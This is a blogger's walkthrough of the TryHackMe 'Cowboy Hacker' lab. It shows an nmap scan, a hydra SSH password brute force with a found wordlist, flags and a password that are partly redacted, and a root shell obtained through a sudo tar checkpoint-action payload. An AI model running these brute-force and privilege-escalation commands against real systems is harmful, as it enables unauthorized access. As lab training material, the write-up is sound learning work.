# Name = Cowboy Hacker
```bash
export IP=10.10.81.11
```

## TryHackMe [Room](https://tryhackme.com/room/cowboyhacker)

This room is described as easy room, and there's really nothing too hard for a begginner like me. First two questions are done, so we look for `#3`.

So we begin by scanning for open ports:
```bash
nmap -sC -sV -A -T4 -v -p- -oN scans/nmap.initial $IP
```

command    |result
-----------|----------
sudo       |run as root
sC         |run default scripts
sV         |enumerate versions
A          |aggressive mode
T4         |run a bit faster
p-         |scan all ports
v          |verbose scan (print results while scanning)
oN         |output to file with nmap formatting
scans/*    |direct output to my subfolder


It looks like there are only three open ports on the machine:

port      |service
----------|----------
21        |FTP
22        |SSH
80        |Web server

Let's go lowest ports first:

On the ftp server we find two files - task.txt and locks.txt. First one gives us answer to the `#3` question - *lin* and a potential username. Second looks like password list to bruteforce with.

Question `#4` has two answers, beacause we can try to bruteforce ftp server, but nothing comes out of it, so the answer is SSH:

```bash
hydra -l lin -P locks.txt ssh://$IP
```

command    |result
-----------|--------
hydra      |runs hydra tool
-l         |use specified login
-P         |use password list from file
ssh://     |target ssh port 22
$IP        |exported ip address

Remember th capital `P` when adding password list to hydra, or else You will be using only `locks.txt` string as a password!

After a second, the result of our action comes through:

[DATA] attacking ssh://10.10.81.11:22/
[22][ssh]  login: lin  password: Red*EDIT*at3

We've got answer to question `#5`, on to the next one:

That was easy! Now log in to the ssh and hunt for flags!
```bash
ssh lin@$IP
```
We're in, time to look for some standard files. 
User flag is usually hidden in `user.txt` file. To find it, we use `find` command:
```bash
find / -name "user.txt" 2>/dev/null
```
command    |result
-----------|--------
find       |search for files
/          |search everywhere
-name      |search for specific name
2>/dev/null|special operand to throw away errors

Oops! Should have just used the `ls` command, because the file we're looking for is in the current working directory!

`#6`User flag:
THM{CR*EDIT*T3}

Time to escalate things. We can use linpeas or another script for privilege escalation path discovery, but simply using `sudo -l` to list commands run as sudo reveals that our `lin` can use `tar` command as sudo.

Quick look at [GTFOBins](https://gtfobins.github.io/#) and search for `tar` bin shows us that we can use it to escalate things:
```
Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

    tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
so i used the command:
```bash
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
and when i type `id` it shows we are root.

Root flag is usually hidden in root.txt file, so to find it we use our well known `find` command:
```bash
find / -name "root.txt" 2>/dev/null
```
and the path to file is /root/root.txt.
`Cat` out the file or `less` it, or `nano` it, whatever You do, don't forget to copy it to TryHackMe page, and that's it! We own the machine!
```
Root:
THM{80*EDIT*3r}
```
Hope You've learned something new today!